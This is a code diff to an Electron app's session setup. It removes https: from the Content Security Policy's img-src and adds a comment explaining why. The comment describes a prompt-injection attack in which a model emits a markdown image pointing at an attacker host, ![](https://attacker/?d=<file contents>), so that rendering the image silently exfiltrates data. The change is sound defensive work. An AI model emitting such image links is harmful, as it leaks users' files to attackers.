@@ -146,9 +146,20 @@ function registerIpc(): void {
 }
 
 function hardenSession(): void {
-  // CSP on both dev and prod (FIX-R2). Dev relaxes only what Vite HMR needs.
-  // img-src includes https: intentionally (FIX-R3) so agent-returned remote
-  // images work the same in dev and packaged builds — no silent breakage.
+  // CSP on both dev and prod (FIX-R2). Dev relaxes only what Vite HMR needs,
+  // and is otherwise identical so a policy problem cannot hide until packaging.
+  //
+  // img-src deliberately EXCLUDES https:. The renderer displays model output as
+  // markdown, and an <img> is fetched the moment it renders — so a
+  // prompt-injected model could emit ![](https://attacker/?d=<file contents>)
+  // and the data would leave silently, with no click. Markdown.tsx offers remote
+  // images as links instead; this line is what makes a missed path fail closed.
+  // data: and blob: stay, because generated images arrive as data: URLs from
+  // readLocalImage and are never fetched over the network.
+  //
+  // This does NOT affect the preview pane. That runs on its own session
+  // partition, which hardenSession never touches, so a user's dev server renders
+  // whatever it likes.
   const isDev = !!process.env.ELECTRON_RENDERER_URL
   const csp = isDev
     ? [
@@ -157,7 +168,7 @@ function hardenSession(): void {
         "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
         "style-src 'self' 'unsafe-inline'",
         "font-src 'self' data:",
-        "img-src 'self' data: blob: https:",
+        "img-src 'self' data: blob:",
         "connect-src 'self' http://localhost:* http://127.0.0.1:* ws://localhost:* ws://127.0.0.1:*",
         "object-src 'none'",
         "base-uri 'none'",
@@ -168,7 +179,7 @@ function hardenSession(): void {
         "script-src 'self'",
         "style-src 'self' 'unsafe-inline'",
         "font-src 'self' data:",
-        "img-src 'self' data: blob: https:",
+        "img-src 'self' data: blob:",
         "connect-src 'self'",
         "object-src 'none'",
         "base-uri 'none'",
